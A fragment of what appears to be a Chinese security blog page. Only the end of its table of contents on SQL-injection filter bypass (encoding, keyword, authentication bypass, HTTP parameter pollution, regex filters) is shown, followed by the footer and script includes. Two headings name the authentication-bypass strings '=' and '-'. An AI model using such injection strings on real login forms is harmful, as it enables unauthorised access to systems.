class="nav-link" href="#注释符-amp-引号"><span class="nav-number">9.4.</span> <span class="nav-text">注释符&引号</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#编码绕过"><span class="nav-number">10.</span> <span class="nav-text">编码绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#关键字绕过"><span class="nav-number">11.</span> <span class="nav-text">关键字绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#认证绕过"><span class="nav-number">12.</span> <span class="nav-text">认证绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#绕过语句：’-’"><span class="nav-number">12.1.</span> <span class="nav-text">绕过语句：’=’</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#绕过语句：-39-39"><span class="nav-number">12.2.</span> <span class="nav-text">绕过语句：'-'</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#类型转换"><span class="nav-number">13.</span> <span class="nav-text">类型转换</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#HTTP参数污染"><span class="nav-number">14.</span> <span class="nav-text">HTTP参数污染</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#实战正则过滤绕过"><span class="nav-number">15.</span> <span class="nav-text">实战正则过滤绕过</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2017</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">KidHat</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v="></script>

  <script type="text/javascript" src="/js/src/motion.js?v="></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v="></script>
<script type="text/javascript" src="/js/src/post-details.js?v="></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v="></script>



  


  




	





  





  












  





  

  

  
  

  

  

  

</body>
</html>
